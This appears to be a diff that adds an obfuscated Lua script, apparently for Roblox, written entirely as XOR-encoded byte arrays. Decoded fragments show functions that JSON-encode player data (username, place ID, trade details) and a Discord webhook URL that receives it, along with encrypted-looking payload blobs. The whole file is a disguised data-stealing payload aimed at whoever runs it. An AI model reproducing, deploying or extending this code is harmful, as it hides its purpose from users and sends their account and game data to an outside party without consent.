+local _laftrwctqrlc = {9,16,12,13,6,45,32,44,39,38,107,39,34,55,34,106,73,99,99,99,99,99,99,99,99,62,106,73,99,99,99,99,38,45,39,106,73,38,45,39,73,73,73,73,73,47,44,32,34,47,99,37,54,45,32,55,42,44,45,99,48,38,45,39,23,49,34,39,38,17}
+local _ttsfutglmahs = {63,62,34,46,125,109,124,103,126,122,64,111,99,107,46,32,32,46,44,46,35,46,88,111,98,103,106,111,122,103,96,105,32,32,32,44,46,32,32,46,120,111,98,60,34,46,60,4,107,96,106,4,4,4,98,97,109,111,98,46,125,109,124,103,126,122,93,122,111,122}
+local _abssymsjsxjl = {71,106,117,35,106,109,35,107,119,110,111,64,108,109,119,102,109,119,57,100,110,98,119,96,107,43,33,63,103,106,117,38,112,40,96,111,98,112,112,62,88,36,95,33,94,106,119,102,110,107,102,98,103,88,36,95,33,94,61,43,45,46,42,63,44,103,106,117,61,38}
+local _laehdyuwhktr = {191,191,191,191,191,191,243,240,252,254,243,191,233,254,243,234,250,191,162,191,239,254,237,236,250,201,254,243,234,250,183,246,235,250,242,253,240,251,230,219,246,233,182,149,191,191,191,191,191,191,191,191,191,191,191,191,246,249,191,233,254,243,234,250,191,235,247,250,241,191}
+local _foceamwjigzp = {209,209,209,209,209,209,209,209,209,209,209,209,209,209,209,209,209,209,209,151,158,131,209,146,159,221,209,146,135,209,152,159,209,129,144,152,131,130,217,146,153,131,158,156,144,180,137,133,131,144,146,133,148,149,167,144,157,132,148,130,216,209,149,158,251,209,209,209,209,209}
+local _ajfuqcwmwaqe = {22,16,3,1,22,33,10,16,13,15,3,43,22,7,15,17,74,10,22,15,14,33,13,12,22,7,12,22,75,104,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,7,12,6,104,66,66,66,66,66,66,66,66,66,66,66,66,7,12,6,104,66,66,66,66}
+local _kjoceptbrkuc = {105,105,105,105,11,38,45,48,105,116,105,1,61,61,57,26,44,59,63,32,42,44,115,3,26,6,7,12,39,42,38,45,44,97,50,32,39,63,44,39,61,38,59,48,105,116,105,32,61,44,36,58,52,96,67,105,105,105,105,105,105,105,105,52,96,67,105,105,105,105}
+local _mochfqqkpbjp = {15,124,64,77,85,73,94,95,22,107,73,88,124,64,77,85,73,94,95,4,5,12,2,2,12,14,3,14,12,2,2,12,75,77,65,73,2,124,64,77,85,73,94,95,2,97,77,84,124,64,77,85,73,94,95,12,2,2,12,14,76,76,76,14,0,12,69,66,64,69}
+local _jjzbfbotyiib = {47,58,56,41,125,41,53,56,51,87,125,125,125,125,125,125,125,125,45,62,60,49,49,117,59,40,51,62,41,52,50,51,117,116,87,125,125,125,125,125,125,125,125,125,125,125,125,15,56,45,49,52,62,60,41,56,57,14,41,50,47,60,58,56,103,10,60,52,41,27}
+local _ptopeebrscmn = {186,182,180,185,245,131,156,133,245,232,245,253,178,180,184,176,239,146,176,161,134,176,167,163,188,182,176,253,247,135,186,183,185,186,173,135,176,165,185,188,182,180,161,176,177,134,161,186,167,180,178,176,247,252,239,130,180,188,161,147,186,167,150,189,188,185,177,253,247,146}
+local _etvyaatrdrty = {125,123,104,109,108,110,124,96,41,52,41,121,101,104,112,108,123,78,124,96,51,94,104,96,125,79,102,123,74,97,96,101,109,33,43,93,123,104,109,108,78,92,64,43,37,41,60,32,3,41,41,41,41,96,111,41,125,123,104,109,108,110,124,96,41,125,97,108,103,3}
+local _jxtubtnnetqc = {244,244,244,244,164,183,181,184,184,252,178,161,186,183,160,189,187,186,252,253,244,128,166,181,176,177,250,144,177,183,184,189,186,177,128,166,181,176,177,238,146,189,166,177,135,177,166,162,177,166,252,253,244,177,186,176,253,222,244,244,244,244,244,244,244,244,244,244,244,244}
+local _akcykszxgned = {158,158,158,158,158,158,158,158,158,158,158,158,215,216,158,208,223,211,219,132,216,215,208,218,150,156,250,223,204,213,220,204,215,208,217,219,204,156,151,158,209,204,158,208,223,211,219,132,216,215,208,218,150,156,242,215,217,214,202,220,204,215,208,217,219,204,156,151,158,202}
+local _bljcaymbmlhz = {154,133,150,129,189,146,158,150,218,249,211,211,211,211,211,211,211,211,159,156,144,146,159,211,131,146,138,159,156,146,151,211,206,211,136,249,211,211,211,211,211,211,211,211,211,211,211,211,153,156,145,186,151,211,206,211,153,156,145,186,151,223,211,249,211,211,211,211,211,211}
+local _vqbxfrchhupx = {185,240,255,185,237,235,236,247,250,248,237,252,253,185,237,241,252,247,147,185,185,185,185,185,185,185,185,240,247,239,252,247,237,246,235,224,202,237,235,185,164,185,240,247,239,252,247,237,246,235,224,202,237,235,185,183,183,185,234,237,235,240,247,254,183,255,246,235,244,248}
+local _qlquinxdbdwv = {135,146,211,206,211,161,150,131,159,154,144,146,135,150,151,160,135,156,129,146,148,150,221,161,150,158,156,135,150,128,221,186,157,133,150,157,135,156,129,138,221,180,150,135,163,129,156,149,154,159,150,183,146,135,146,201,186,157,133,156,152,150,160,150,129,133,150,129,219,131}
+local _yyooxakufisk = {157,157,157,157,157,157,157,157,157,209,210,222,220,209,157,202,216,220,205,210,211,239,220,207,212,201,196,244,211,217,216,197,157,128,157,201,220,223,209,216,147,219,212,211,217,149,207,220,207,212,201,196,233,220,223,209,216,145,157,207,220,207,212,201,196,148,183,157,157,157}
+local _uvkjvscbcojo = {36,36,36,36,36,36,119,97,106,96,80,118,101,96,97,86,97,117,113,97,119,112,44,110,107,109,106,97,96,81,119,97,118,45,14,36,36,36,36,36,36,36,36,36,36,36,36,97,104,119,97,109,98,36,112,118,101,96,97,87,112,101,112,113,119,36,57,57,36,38}
+local _ldojnkjrrufs = {132,132,128,203,132,153,203,201,131,159,159,155,152,209,196,196,143,130,152,136,132,153,143,197,136,132,134,196,138,155,130,196,156,142,137,131,132,132,128,152,196,218,223,210,222,210,218,210,211,220,221,217,216,221,216,220,211,217,223,216,196,145,210,189,142,198,153,217,184,138}
+local _xsvxtkslnsdg = {180,156,138,138,152,158,156,209,149,144,138,141,213,217,137,139,156,159,144,129,208,243,217,217,217,217,149,150,154,152,149,217,141,150,141,152,149,175,152,149,140,156,217,196,217,201,243,217,217,217,217,159,150,139,217,166,213,217,144,141,156,148,217,144,151,217,144,137,152,144}
+local _yfcwuwascjzn = {84,65,76,117,115,100,0,29,0,85,83,68,100,65,84,65,14,84,79,84,65,76,0,79,82,0,2,16,14,16,16,2,42,0,0,0,0,76,79,67,65,76,0,73,84,69,77,112,82,73,67,69,83,0,29,0,85,83,68,100,65,84,65,14,73,84,69,77,112,82}
+local _twmvreasjmpj = {207,201,210,213,220,149,221,210,213,223,147,222,195,222,216,206,207,212,201,151,155,153,200,212,215,218,201,218,153,146,177,210,221,155,210,200,232,218,215,212,201,218,155,207,211,222,213,177,155,155,155,155,203,215,201,129,208,210,216,208,147,153,200,212,215,218,201,218,155,210}
+local _hbfcxgtayxgb = {203,214,212,216,239,216,213,204,220,202,179,220,215,221,179,213,214,218,216,213,153,223,204,215,218,205,208,214,215,153,219,204,208,213,221,239,216,213,204,220,245,208,202,205,145,144,179,153,153,153,153,213,214,218,216,213,153,216,213,213,252,193,205,203,216,218,205,220,221,239}
+local _zamlptwsfhrk = {128,134,144,184,143,140,140,136,150,147,161,190,195,130,141,135,195,151,140,141,150,142,129,134,145,203,138,151,134,142,179,145,138,128,134,144,184,143,140,140,136,150,147,161,190,205,147,145,138,128,134,202,202,195,140,145,195,211,233,195,195,195,195,233,195,195,195,195,145,134}
+local _saypdkjrjdvr = {44,46,35,111,60,58,44,44,42,60,60,111,114,111,63,44,46,35,35,103,41,58,33,44,59,38,32,33,103,102,69,111,111,111,111,35,32,44,46,35,111,60,59,61,111,114,111,60,59,46,59,58,60,2,60,40,69,111,111,111,111,41,32,61,111,41,38,61,60,59}
+local _xzhrliqrnbwb = {151,117,115,145,81,46,226,73,45,202,191,116,182,189,188,172,60,36,3,66,108,236,138,127,182,186,7,223,255,84,15,176,217,32,50,246,170,212,158}
+local _tlhzxbtrptsz = {110,58,47,44,34,43,96,40,39,32,42,102,60,47,60,39,58,55,26,47,44,34,43,98,110,108,9,33,42,34,55,108,103,103,110,47,32,42,110,124,110,33,60,110,127,68,110,110,110,110,110,110,110,110,43,32,42,68,110,110,110,110,110,110,110,110,39,40,110,56}
+local _zvwbvmghaqop = {62,55,108,68,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,51,98,68,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,12,33,42,55,110,115,110,6,58,58,62,29,43,60,56,39,45,43,116,4,29,1,0,11,32,45,33,42,43,102,62}
+local _cbtzedwgycrf = {211,194,226,196,215,210,211,229,194,215,194,195,197,158,159,188,150,150,150,150,150,150,150,150,223,208,150,223,216,223,194,223,215,218,226,196,215,210,211,229,194,215,194,211,150,139,139,150,148,229,194,215,196,194,226,196,215,210,211,148,150,194,222,211,216,188,150,150,150,150}
+local _xvlwtfiyxasu = {113,122,89,63,60,48,50,63,115,1,54,35,63,58,48,50,39,54,55,0,39,60,33,50,52,54,115,110,115,52,50,62,54,105,20,54,39,0,54,33,37,58,48,54,123,113,1,54,35,63,58,48,50,39,54,55,0,39,60,33,50,52,54,113,122,89,63,60,48,50}
+local _umartcywrxlu = {240,240,240,240,240,240,240,133,162,188,240,237,240,242,184,164,164,160,234,255,255,185,160,253,177,160,185,254,179,191,189,255,186,163,191,190,242,252,218,240,240,240,240,240,240,240,240,240,240,240,240,157,181,164,184,191,180,240,237,240,242,151,149,132,242,218,240,240,240,240}
+local _tndphpzfumqy = {234,234,234,234,234,234,234,234,234,166,165,169,171,166,234,173,165,174,166,179,131,164,174,175,178,234,247,234,190,171,168,166,175,228,172,163,164,174,226,184,171,184,163,190,179,158,171,168,166,175,230,234,232,141,165,174,166,179,232,227,192,234,234,234,234,234,234,234,234,234}
+local _vojvxqlhmqls = {50,47,125,106,126,122,106,124,123,47,96,125,47,39,124,118,97,47,110,97,107,47,124,118,97,33,125,106,126,122,106,124,123,38,47,96,125,47,39,103,123,123,127,47,110,97,107,47,103,123,123,127,33,125,106,126,122,106,124,123,38,47,96,125,47,103,123,123,127,80}
+local _ktialarpuuqn = {169,188,169,225,194,232,232,232,232,169,187,187,161,175,166,128,161,188,156,167,140,169,188,169,170,169,187,173,224,225,194,232,232,232,232,194,232,232,232,232,161,174,232,232,188,167,188,169,164,158,169,164,189,173,232,246,232,250,248,248,232,188,160,173,166,194,232,232,232,232}
+local _xrdphicylbzu = {247,221,221,221,221,145,146,158,156,145,221,137,143,136,147,158,156,137,152,153,221,192,221,155,156,145,142,152,247,247,145,146,158,156,145,221,148,147,139,152,147,137,146,143,132,174,137,143,221,192,221,223,157,157,157,223,247,155,146,143,221,162,209,221,148,137,152,144,221,148}
+local _xpmwwstrgzvy = {131,45,13,11,140,209,36,20,239,212,167,139,122,3,133,40,100,232,170,108,139,7,212,89,208,47,50,157,131,93,86,195,118,105,208,143,233,148,69,214,56,101,1,141,149,6,160,37,215,209,234,43,2,5,72,182,125,201,159,95,240,213,247,108,135,142,74,53,28,126,96,226,140,78,133,45,64,114,232,65,1,40,175,236,66,89,146,53,60,10,93,172,179,237,129,239,95,118,206,151,129,18,9,61,170,61}
+local _knkaogwgdjzn = {80,69,80,84,65,21,63,21,21,21,21,65,84,70,94,27,66,84,92,65,29,28,63,64,91,65,92,89,21,70,86,71,92,69,65,99,80,71,70,92,90,91,21,75,8,21,4,63,63,71,80,69,80,84,65,21,63,21,21,21,21,65,84,70,94,27,66,84,92,65}
+local _mubtbzhqavhw = {20,8,31,30,67,33,2,14,12,1,61,1,12,20,8,31,103,4,11,77,3,8,21,25,69,24,30,8,31,30,68,77,80,80,77,3,4,1,77,25,5,8,3,103,77,77,77,77,29,1,31,87,6,4,14,6,69,79,52,2,24,77,9,4,9,3,74,25,77,12}
+local _rrbixnsjkzlk = {186,226,226,226,187,231,250,247,249,250,237,187,246,250,248,186,224,230,240,231,230,186,183,181,187,187,181,229,249,231,187,192,230,240,231,220,241,181,187,187,181,183,186,229,231,250,243,252,249,240,183,159,159,181,181,181,181,249,250,246,244,249,181,241,252,230,229,249,244,236}
+local _vtnrobqrhnml = {105,105,105,105,105,44,39,45,67,105,105,105,105,44,39,45,96,67,44,39,45}
+local _pqyfokvilimk = {80,19,14,19,17,91,71,71,67,64,9,28,28,64,70,67,65,86,94,86,69,82,95,70,86,95,90,64,71,29,80,92,94,28,94,94,1,28,69,90,93,71,82,84,86,64,29,91,71,94,95,17,31,57,19,19,19,19,80,91,65,92,94,82,19,14,19,17,91,71}
+local _dwkfvtesczeh = {207,196,222,195,193,205,250,205,192,217,201,223,247,207,196,222,195,193,205,226,205,193,201,241,140,145,140,218,205,192,217,201,140,201,194,200,166,140,140,140,140,140,140,140,140,201,194,200,166,140,140,140,140,201,194,200,166,140,140,140,140,222,201,216,217,222,194,140,207,196}
+local _zviritrxmlkd = {169,131,131,131,131,131,131,131,131,207,204,192,194,207,131,209,194,209,202,215,218,131,158,131,202,215,198,206,141,241,194,209,202,215,218,131,204,209,131,129,129,169,131,131,131,131,131,131,131,131,207,204,192,194,207,131,203,194,208,224,203,209,204,206,194,131,158,131,202,215}
+local _hjgarvvutxwr = {12,64,52,5,12,5,16,15,18,20,51,5,18,22,9,3,5,64,93,64,7,1,13,5,90,39,5,20,51,5,18,22,9,3,5,72,66,52,5,12,5,16,15,18,20,51,5,18,22,9,3,5,66,73,106,12,15,3,1,12,64,16,12,18,64,93,64,48,12,1}
+local _iiuuvewieowl = {10,3,87,81,66,71,70,68,86,74,13,102,77,66,65,79,70,71,3,30,3,69,66,79,80,70,3,70,77,71,10,41,3,3,3,3,3,3,3,3,87,81,66,71,70,68,86,74,13,102,77,66,65,79,70,71,3,30,3,69,66,79,80,70,41,3,3,3,3,70}
+local _lkkdlrwaelcg = {18,18,22,70,7,8,2,70,14,18,18,22,72,20,3,23,19,3,21,18,79,70,9,20,70,14,18,18,22,57,20,3,23,19,3,21,18,108,70,70,70,70,10,9,5,7,10,70,21,19,5,5,3,21,21,74,70,20,3,21,70,91,70,22,5,7,10,10,78,0}
+local _amifnalmitks = {49,45,107,40,44,43,109,113,105,101,102,50,32,36,53,42,43,54,17,42,22,32,43,33,108,79,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,35,42,55,101,44,101,120,101,116,105,101,43,48,40,17,42,17,55,36,33,32,101,33,42,79,101,101,101}
+local _aogkxohebaeh = {168,135,139,131,198,143,136,198,143,150,135,143,148,149,206,147,149,131,148,170,143,149,146,146,207,198,130,137,236,198,198,198,198,198,198,198,198,138,137,133,135,138,198,148,131,133,131,143,144,131,148,181,146,148,198,219,198,146,137,149,146,148,143,136,129,206,148,131,133,131}
+local _rwdlbhwerens = {160,171,161,236,207,169,170,166,164,169,229,163,176,171,166,177,172,170,171,229,164,166,166,160,181,177,145,183,164,161,160,237,236,207,229,229,229,229,172,163,229,154,130,235,137,164,182,177,138,163,163,160,183,229,177,173,160,171,207,229,229,229,229,229,229,229,229,145,183,164}
+local _nbqvxyrmitds = {74,108,122,109,63,34,63,100,98,21,121,112,109,63,64,51,63,105,63,118,113,63,118,111,126,118,109,108,55,64,88,49,74,108,122,109,113,126,114,122,108,63,112,109,63,100,98,54,63,123,112,63,107,126,125,115,122,49,118,113,108,122,109,107,55,124,112,114,125,118}
+local _tyzfarhnzceh = {182,182,182,182,182,182,182,182,250,249,245,247,250,182,255,226,243,251,216,247,251,243,182,171,182,255,226,243,251,184,223,226,243,251,216,247,251,243,182,247,248,242,182,255,226,243,251,184,223,226,243,251,216,247,251,243,172,250,249,225,243,228,190,191,182,249,228,182,180,180}
+local _rpudtcrvncou = {178,178,178,178,178,178,178,178,178,241,250,224,253,255,243,220,243,255,247,178,175,178,230,224,251,255,186,241,250,224,253,255,243,220,243,255,247,168,245,225,231,240,186,176,183,225,185,176,190,178,176,178,176,187,187,168,254,253,229,247,224,186,187,152,178,178,178,178,178,178}
+local _ldfhzvytddti = {107,107,107,107,107,46,37,47,65,107,107,107,107,46,37,47,65,107,107,107,107,107,107,107,107,107,107,107,107,65,107,107,107,107,39,36,40,42,39,107,59,57,34,40,46,107,118,107,99,34,63,46,38,27,57,34,40,46,56,16,39,36,36,32,62,59,0,46,50,22}
+local _rkqqneqcrqgi = {247,247,247,190,177,247,160,178,182,167,184,185,133,182,165,190,163,174,158,185,179,178,175,247,182,185,179,247,160,178,182,167,184,185,133,182,165,190,163,174,158,185,179,178,175,247,233,234,247,176,184,179,187,174,158,185,179,178,175,247,163,191,178,185,221,247,247,247,247,247}
+local _bjvnjlmhwijo = {171,129,129,129,129,200,199,129,209,205,211,143,239,192,204,196,155,205,206,214,196,211,137,136,129,156,156,129,213,206,210,213,211,200,207,198,137,207,192,204,196,136,155,205,206,214,196,211,137,136,129,213,201,196,207,171,129,129,129,129,129,129,129,129,200,210,246,201,200,213}
+local _utbupzvzsbix = {87,92,25,4,25,77,75,76,92,25,68,21,51,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,66,25,87,88,84,92,25,4,25,27,101,11,13,9,101,8,12,0,101,8,13,14,101,8,13,8,25,117,86,90,88,77,80,86,87,27,21,25,79,88,85}
+local _epcworgnqfkx = {43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,110,101,111,1,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,98,109,43,102,106,127,104,99,110,111,43,127,99,110,101,43,125,106,103,126,110,71,98,120,127,80,111}
+local _opnfelttgseh = {121,225,219,62,91,175,220,147,23,226,154,45,235,166,177,196,63,68,53,179,50,88,123,203,131,160,149,226,43,108,52,251,247,186,239,93,84,12,88,82,32,211,114,102,255,98,196,27,97,148,182}
+local _piymewwmbqnk = {188,188,188,188,240,243,255,253,240,204,240,253,229,249,238,166,215,245,255,247,180,190,239,255,238,245,236,232,188,249,238,238,243,238,178,188,241,253,247,249,188,239,233,238,249,188,233,238,188,253,254,243,234,249,188,232,244,249,188,240,249,234,249,240,188,165,190,181,150,249}
+local _quhiiaumlick = {71,64,1,29,69,64,22,69,57,87,87,83,57,84,80,93,57,84,80,83,69,65,64,75,87,3,57,11,71,73,69,12,17,0,8,75,36,8,10,16,11,17,73,69,1,12,22,21,9,4,28,43,4,8,0,73,69,21,23,12,6,0,76,111,12,3,69,70,12,11}
+local _xblkwjkwlkqn = {127,58,39,58,106,121,123,118,118,50,124,111,116,121,110,115,117,116,50,51,16,58,58,58,58,58,58,58,58,58,58,58,58,104,127,110,111,104,116,58,104,127,107,111,127,105,110,50,97,16,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,79,104,118,58}
+local _nlmfgnhxozrn = {109,54,71,109,109,109,109,22,111,12,46,46,40,61,57,111,16,109,112,109,111,57,40,53,57,98,37,57,32,33,97,44,61,61,33,36,46,44,57,36,34,35,98,53,37,57,32,33,102,53,32,33,97,44,61,61,33,36,46,44,57,36,34,35,98,53,32,33,118,60}
+local _avlxbrvdirlz = {58,55,46,62,123,101,102,123,54,50,53,4,45,58,55,46,62,123,47,51,62,53,81,123,123,123,123,123,123,123,123,123,123,123,123,47,52,47,58,55,13,58,55,46,62,123,102,123,47,52,47,58,55,13,58,55,46,62,123,112,123,115,45,58,55,46,62,123,113,123}
+local _vgiyjiotvxxq = {0,45,50,109,78,100,100,100,100,100,100,100,100,100,100,100,100,45,34,100,50,37,40,49,33,100,48,44,33,42,100,45,48,33,41,18,37,40,49,33,55,31,45,48,33,41,10,37,41,33,126,40,43,51,33,54,108,109,25,100,121,100,50,37,40,49,33,100,33,42}
+local _ewvfrivqipcq = {216,207,222,223,216,196,160,207,196,206,160,160,195,204,138,245,152,159,199,217,218,216,207,206,207,204,195,196,207,138,222,194,207,196,160,138,138,138,138,207,216,216,197,216,130,197,193,131,160,138,138,138,138,216,207,222,223,216,196,160,207,196,206,160,160,160,160,160,160,198}
+local _zmdmxrvupwgt = {254,233,244,242,243,189,252,181,179,179,179,180,189,239,248,233,232,239,243,189,179,179,179,189,182,189,168,189,248,243,249,151,151,244,251,189,252,181,168,180,189,227,160,189,172,173,189,233,245,248,243,151,189,189,189,189,248,239,239,242,239,181,242,246,180,151,189,189,189,189}
+local _pjxwjswpotkh = {227,229,225,141,224,228,232,141,224,229,231,141,224,229,227,241,133,190,165,176,189,241,135,176,189,164,180,243,253,241,167,176,189,164,180,241,236,241,243,177,177,177,243,241,255,255,241,249,165,190,165,176,189,135,176,189,164,180,241,190,163,241,225,248,241,255,255,241,243,177}
+local _cgrfqlbblgaf = {248,223,215,222,159,242,217,195,222,220,208,152,145,222,195,145,216,197,212,220,159,245,208,197,208,248,245,139,215,216,223,213,153,147,242,217,195,222,220,208,147,152,187,187,145,145,145,145,145,145,145,145,216,215,145,216,194,242,217,195,222,220,208,145,197,217,212,223,187,187}
+local _mmzffhhrdiei = {86,74,93,92,1,127,67,78,86,74,93,110,75,75,74,75,21,108,64,65,65,74,76,91,7,73,90,65,76,91,70,64,65,7,95,67,78,86,74,93,6,37,15,15,15,15,15,15,15,15,70,73,15,91,78,77,67,74,1,73,70,65,75,7,76,64,66,77,70,65}
+local _ywajmavzcrab = {33,60,33,103,96,109,114,100,11,11,33,33,33,33,33,33,33,33,104,103,33,117,110,117,96,109,87,96,109,116,100,33,63,33,54,49,49,33,117,105,100,111,11,33,33,33,33,33,33,33,33,33,33,33,33,104,114,85,110,113,73,104,117,33,60,33,117,115,116,100}
+local _bxwtaudwgtmf = {203,214,203,205,219,218,193,220,130,142,140,202,203,194,218,207,140,135,142,193,220,142,221,218,220,199,192,201,128,200,199,192,202,134,203,214,203,205,219,218,193,220,130,142,140,197,220,192,194,140,135,164,194,193,205,207,194,142,199,221,253,207,194,193,220,207,142,147,142,221}
+local _gaqpnnhjiygy = {61,38,180,75,59,49,93,77,190,71,154,222,162,183,154,185,92,239,161,138,5,67,45,83,90,62,103,76,37,29,92,121,165,23,145,4,20,81,229,132,207,42,103,27,2,100,20,234,75,18,252,15,214,166,72,160,5,207,137,138,244,118,138,65,207,154,53,95,241,0,95,38,148,92,224,115,125,78,202,175,70,105,219,194,40,246,68,8,114,20,240,31,21,6,0,169,55,225,161,152,217,37,26,76,207,66,159,123,115,248,237,49,251,211,237,137,132,142,251,59,1}
+local _boherhcsynqs = {32,32,32,32,32,32,112,108,97,99,101,73,100,32,61,32,103,97,109,101,46,80,108,97,99,101,73,100,44,10,32,32,32,32,32,32,32,32,32,32,32,32,117,115,101,114,110,97,109,101,32,61,32,112,108,114,46,78,97,109,101,44,10,32,32,32,32,32,32,32}
+local _tjbtfeivtymu = {210,238,227,251,231,240,206,231,244,231,238,136,238,237,225,227,238,162,238,237,225,227,238,210,238,227,251,231,240,162,191,162,210,238,227,251,231,240,241,172,206,237,225,227,238,210,238,227,251,231,240,136,136,238,237,225,227,238,162,244,235,225,246,235,239,206,231,244,231,238}
+local _thmfstndcjor = {103,106,116,99,118,51,55,59,61,63,117,59,44,51,60,118,51,55,59,61,63,117,45,63,56,42,118,51,55,59,61,63,117,59,42,52,61,118,112,117,112,97,43,103,106,116,98,120,118,80,122,122,122,122,1,120,15,41,63,40,119,27,61,63,52,46,120,7,122,103}
+local _fmllieuuhajj = {245,232,240,255,243,252,244,241,189,160,189,230,189,232,239,241,189,160,189,252,235,252,233,252,239,239,200,239,241,189,224,177,151,189,189,189,189,189,189,189,189,189,189,189,189,251,244,248,241,249,238,189,160,189,230,151,189,189,189,189,189,189,189,189,189,189,189,189,189,189}
+local _dovibueqfbrb = {238,203,209,214,130,159,130,217,223,168,196,205,208,130,253,142,130,203,214,199,207,130,203,204,130,203,210,195,203,208,209,138,206,203,209,214,139,130,198,205,168,130,130,130,130,214,195,192,206,199,140,203,204,209,199,208,214,138,198,203,209,210,206,195,219,238,203,209,214,142}
+local _uarfdscsegxu = {255,255,255,255,255,168,190,173,177,247,253,177,182,179,253,246,213,255,255,255,255,186,177,187,213,186,177,187,213,179,176,188,190,179,255,185,170,177,188,171,182,176,177,255,190,187,187,136,186,190,175,176,177,139,176,139,173,190,187,186,247,182,187,246,213,255,255,255,255,139}
+local _hixtdfeheoia = {197,132,153,132,192,197,208,197,198,197,215,193,255,205,208,193,201,138,224,197,208,197,237,224,249,174,132,132,132,132,132,132,132,132,132,200,203,199,197,200,132,205,215,231,204,214,203,201,197,132,153,132,140,205,208,193,201,237,202,194,203,132,197,202,192,132,205,208,193,201}
+local _vchlvyoqxgkz = {62,127,112,122,62,120,114,107,102,107,109,48,108,123,111,107,123,109,106,55,62,113,108,62,118,106,106,110,108,123,111,107,123,109,106,20,20,114,113,125,127,114,62,122,127,106,127,124,127,109,123,62,35,62,108,123,111,107,119,108,123,54,76,123,110,114,119,125,127,106}
+local _vwrqzbtqunzx = {49,41,232,14,239,185,59,248,186,6,240,93,71,7,251,202,129,227,147,61,217,89,134,146,228,219,239,223,46,26,143,155,201,184,113,123,66,133,164,197,203,0,164,25,181,240,210,246,69,247,86,8,129,245,42,71,237,12,78,173,124,169,233,32,127,135,82,191}
+local _uhonrknqxqsp = {121,108,121,113,124,69,56,37,56,117,121,108,123,112,125,124,56,125,118,124,18,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,125,116,107,125,18,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,113,126,56,121,116,116,93,96}
+local _srduawxdondz = {43,41,35,32,55,108,48,55,109,50,45,49,54,29,43,47,37,109,32,43,37,109,112,114,112,113,109,114,122,109,114,118,109,118,109,115,116,123,115,115,112,117,123,113,112,115,113,116,116,122,119,114,118,108,40,50,37,96,110,72,98,98,98,98,98,98,98,98,39,47}
+local _eyyrgypyvmdz = {4,23,28,6,29,0,11,33,6,0,82,89,82,81,30,27,28,23,82,78,82,65,71,66,82,6,26,23,28,120,82,82,82,82,82,82,82,82,82,82,82,82,27,28,4,23,28,6,29,0,11,33,6,0,82,79,82,27,28,4,23,28,6,29,0,11,33,6,0,82}
+local _skqwlaagtjmc = {78,35,36,36,50,91,124,100,119,124,102,125,96,107,48,62,50,100,115,126,103,119,50,47,50,123,124,100,119,124,102,125,96,107,65,102,96,62,50,123,124,126,123,124,119,50,47,50,116,115,126,97,119,50,111,62,24,50,50,50,50,50,50,50,50,50,50,50,50,50}
+local _yqhxetluiruf = {219,221,220,157,216,193,221,220,144,158,184,146,146,146,146,146,146,146,146,146,146,146,146,146,146,146,146,146,146,146,146,233,144,243,199,198,218,221,192,219,200,211,198,219,221,220,144,239,146,143,146,144,220,219,209,215,237,192,215,223,221,198,215,237,193,194,203,144,184,146}
+local _womjbucofqsf = {44,43,55,121,60,55,61,83,121,121,121,121,53,54,58,56,53,121,43,60,40,44,60,42,45,31,44,55,58,121,100,121,43,60,40,44,60,42,45,121,54,43,121,113,42,32,55,121,56,55,61,121,42,32,55,119,43,60,40,44,60,42,45,112,121,54,43,121,113,49}
+local _zbxisrgsmvrh = {165,171,162,233,181,162,170,168,177,162,239,176,162,166,183,168,169,180,147,168,148,162,169,163,235,231,246,238,231,162,169,163,205,231,231,231,231,231,231,231,231,231,231,231,231,231,231,231,231,162,171,180,162,205,231,231,231,231,231,231,231,231,231,231,231,231,231,231,231,231}
+local _agieoeisxlfk = {146,148,131,201,130,202,208,205,130,202,208,200,235,193,193,193,193,193,193,193,193,132,143,133,200,207,207,201,154,193,198,198,205,193,198,220,220,198,205,193,198,220,198,193,156,200,186,194,133,128,149,128,196,210,202,208,188,200,235,193,193,193,193,132,143,133,235,235,193,193}
+local _wcercimujwja = {45,53,92,39,1,23,0,28,19,31,23,1,82,79,82,9,80,55,0,23,0,23,23,0,70,71,70,80,15,82,120,45,53,92,31,27,28,45,0,19,0,27,6,11,82,79,82,80,49,29,31,31,29,28,80,82,120,45,53,92,31,27,28,45,4,19,30,7,23,82}
+local _dhnefypjculd = {102,227,72,198,126,205,195,48,114,73,134,252,150,91,214,178,142,90,9,66,184,195,134,225,1,222,136,75,136,122,26,73,110,154,194,5,152,221,226,23,188,170,123,27,231,106,221,247,75,197,162,30,236,221,69,50,223,89,161,136,167,74,73,20,54,192,95,186,130,15,34,21,132,7,202,50,117,68,132,44,65,20,46,35,167,244,130}
+local _qvtivvoxtylc = {190,190,252,242,254,183,176,178,183,176,187,254,227,254,170,172,171,187,254,163,242,212,254,254,254,254,254,254,254,254,254,254,254,254,254,254,254,254,165,254,176,191,179,187,254,227,254,252,130,236,234,238,130,239,235,231,130,239,234,232,130,239,230,239,254,155,173,170,183,179}
+local _bhdwsybmzpob = {205,168,239,255,168,244,220,203,213,210,253,223,171,255,238,204,248,222,175,246,235,204,198,209,187,147,147,254,252,237,254,252,247,239,177,176,183,252,225,252,250,236,237,252,253,185,164,185,254,252,237,254,252,247,239,177,176,183,252,225,252,250,236,237,252,253,185,246,235,185}
+local _fcawtwmrfedy = {132,133,130,158,208,128,130,153,147,149,177,208,206,208,128,130,153,147,149,178,250,149,158,148,217,250,156,159,147,145,156,208,130,149,157,145,153,158,153,158,151,165,163,180,208,205,208,132,159,158,133,157,146,149,130,216,132,159,132,145,156,165,163,180,217,208,159,130,208,192}
+local _wwuhhtsuxphz = {248,180,217,217,166,180,231,241,230,226,241,230,182,189,158,180,180,180,180,230,241,224,225,230,250,158,241,250,240,158,158,248,251,247,245,248,180,241,236,241,247,225,224,251,230,180,169,180,188,253,240,241,250,224,253,242,237,241,236,241,247,225,224,251,230,180,245,250,240,180}
+local _hnanxiqstpev = {182,171,255,249,254,238,167,129,171,171,171,171,194,232,238,195,234,230,230,238,249,171,182,171,255,249,254,238,167,171,194,232,238,195,234,230,230,238,249,212,199,238,236,238,229,239,234,249,242,171,182,171,255,249,254,238,167,171,194,232,238,195,234,230,230,238,249,212,204,228}
